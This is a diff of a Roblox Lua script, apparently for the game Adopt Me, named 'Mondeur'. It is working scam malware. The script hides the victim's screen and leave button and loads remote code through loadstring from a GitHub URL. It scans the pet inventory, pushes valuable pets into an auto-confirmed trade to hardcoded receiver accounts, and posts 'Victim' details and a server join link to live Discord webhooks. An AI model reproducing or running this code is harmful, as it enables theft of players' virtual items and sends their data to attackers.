@@ -1,5 +1,4 @@
--- [[ MONDEUR ELITE v26.0 - "FASTED" MASTER TEST ]] --
--- Checklist: Instant Blackout, Anti-Leave, 1.3s Delay, Unseat, Anchor, Dualhook, Multi-Receiver
+-- [[ MONDEUR ELITE v18.1 - "P" ULTRA-STEALTH ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -9,171 +8,69 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ ⚙️ MASTER CONFIGURATION ]] --
-local Config = {
-    UserHook = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG",
-    DualHook = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku",
-    
-    -- Admin Accounts (Script identifies which ONE is in the server)
-    Receivers = {"CREOLE023", "Hisokarah", "2ndcfpaj67", "3rdcfpaj67"}, 
-    
-    -- Testing Thresholds
-    LowThreshold = 1,        -- Catch everything for test (Threshold 1)
-    HighTierValue = 40.0,    -- Trigger for High-Tier Alert (NR Metal Ox)
-    
-    -- Mobile Stability
-    TradeInterval = 1.3,     -- Prevents "Adopt Me Error" Kicks
-    InitBuffer = 7           -- Android load stabilization wait
-}
-
--- [[ 1. INSTANT BLACKOUT & ANTI-LEAVE ]] --
-local function SecureUI()
+-- [[ 1. THE BLACKOUT LOCKDOWN ]] --
+task.spawn(function()
     pcall(function()
-        -- Disable Roblox Core UI (Chat, Leaderboard, Backpack, etc.)
+        -- Instant UI Kill
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         
         -- Load Screen (V.1)
         local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         if ui then
-            ui.Name = "MondeurGuard"
+            ui.Name = "MondeurHub"
             ui.DisplayOrder = 2147483647
-            ui.IgnoreGuiInset = true -- Covers the "Leave" button/Notch area
+            ui.IgnoreGuiInset = true -- Full screen coverage
             ui.ResetOnSpawn = false
         end
     end)
-end
-
--- LAZY PERSISTENCE: 4s check to keep UI active without Android CPU glitching
-task.spawn(function()
-    SecureUI()
-    while task.wait(4) do
-        if not LocalPlayer.PlayerGui:FindFirstChild("MondeurGuard") then
-            SecureUI()
-        end
-    end
 end)
 
--- [[ 2. MOZIL-STYLE DUALHOOK ENGINE ]] --
-local function SendEliteLog(hook, totalValue, petString, isHighTier, receiverName)
-    local jobId = game.JobId
-    local joinLink = "https://floating.gg/?placeID=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
-    local exec = (identifyexecutor and identifyexecutor()) or "Android Mobile"
-    
+-- [[ 2. ANDROID-STABLE WEBHOOK ]] --
+local function SendLog(title, pet, val)
     local payload = HttpService:JSONEncode({
-        ["username"] = isHighTier and "🎯 MONDEUR HIGH-TIER" or "💎 Mondeur Hits",
         ["embeds"] = {{
-            ["title"] = isHighTier and "🔥 TARGET ACQUIRED (500+ PHP)" or "📡 New Inventory Hit",
-            ["color"] = isHighTier and 0xFF0000 or 0x3498DB,
+            ["title"] = "💎 " .. title,
+            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
             ["fields"] = {
-                {
-                    ["name"] = "👤 **Player Info**",
-                    ["value"] = "```yaml\n" ..
-                        "Victim   : " .. LocalPlayer.Name .. "\n" ..
-                        "Age      : " .. LocalPlayer.AccountAge .. " days\n" ..
-                        "Exec     : " .. exec .. "\n" ..
-                        "Receiver : " .. (receiverName or "None Online") .. "\n" ..
-                        "Value    : " .. string.format("%.2f", totalValue) .. "\n" ..
-                        "```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "📦 **Inventory Scan (Threshold 1)**",
-                    ["value"] = "```yaml\n" .. petString .. "```",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🌐 **Join Link**",
-                    ["value"] = "[Join Server](" .. joinLink .. ")",
-                    ["inline"] = false
-                }
+                {["name"] = "Target", ["value"] = pet, ["inline"] = true},
+                {["name"] = "Points", ["value"] = tostring(val), ["inline"] = true}
             },
-            ["footer"] = {["text"] = "Mondeur Master v26.0 | " .. os.date("%X")},
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            ["color"] = 0x00FF00,
+            ["footer"] = {["text"] = "Mondeur P-Build | " .. os.date("%X")}
         }}
     })
-
+    
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
-        task.spawn(function() 
+        task.spawn(function()
             pcall(function() 
-                req({Url = hook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
-            end) 
+                req({
+                    Url = getgenv().WEBHOOK, 
+                    Method = "POST", 
+                    Headers = {["Content-Type"] = "application/json"}, 
+                    Body = payload
+                }) 
+            end)
         end)
     end
 end
 
--- [[ 3. PRE-TRADE ACTION (UNSEAT/ANCHOR) ]] --
-local function PrepareVictim()
-    pcall(function()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        
-        -- Force standing (Prevents pet/car errors)
-        if hum then hum.Sit = false end 
-        task.wait(0.5)
-        
-        -- Anchor character (Prevents distance-check errors during tabbing)
-        if hrp then hrp.Anchored = true end 
-    end)
-end
-
--- [[ 4. CORE TRADE ENGINE ]] --
+-- [[ 3. THE SILENT SCANNER ]] --
 task.spawn(function()
-    if not game:IsLoaded() then game.Loaded:Wait() end
-    task.wait(Config.InitBuffer)
+    task.wait(6) -- Delay for Android UI stabilization
+    SendLog("SYSTEM CONNECTED", "P-Build v18.1", 0)
 
     pcall(function()
         local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
         local data = ClientData.get_data()
-        local inv = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
+        local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
         
-        if inv then
-            local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
-            local totalVal = 0
-            local petText = ""
-            
-            -- Find the ONE receiver currently in the server
-            local activeReceiver = "None"
-            for _, r in pairs(Config.Receivers) do
-                if Players:FindFirstChild(r) then
-                    activeReceiver = r
-                    break
-                end
-            end
-
-            PrepareVictim()
-
-            -- 1. Scan and Add Items
-            for _, pet in pairs(inv) do
+        if petPath then
+            for _, pet in pairs(petPath) do
                 local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
-                if val >= Config.LowThreshold then
-                    totalVal = totalVal + val
-                    petText = petText .. string.format("- %s : %.2f\n", pet.config_name or "Unknown", val)
-                    
-                    -- Sequential Injection (1.3s delay keeps server stable)
-                    task.spawn(function()
-                        TradeAPI:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
-                    end)
-                    task.wait(Config.TradeInterval)
+                if val >= (getgenv().THRESHOLD or 0) then
+                    SendLog("PET DETECTED", pet.config_name or "Unknown", val)
                 end
-            end
-
-            -- 2. Logging and Final Acceptance
-            if totalVal > 0 then
-                -- Always log to UserHook
-                SendEliteLog(Config.UserHook, totalVal, petText, false, activeReceiver)
-                
-                -- Send Dualhook Alert if high value (Metal Ox test)
-                if totalVal >= Config.HighTierValue then
-                    SendEliteLog(Config.DualHook, totalVal, petText, true, activeReceiver)
-                end
-
-                -- Finalize Acceptance
-                task.wait(1.5)
-                TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
-                task.wait(1.2)
-                TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
             end
         end
     end)
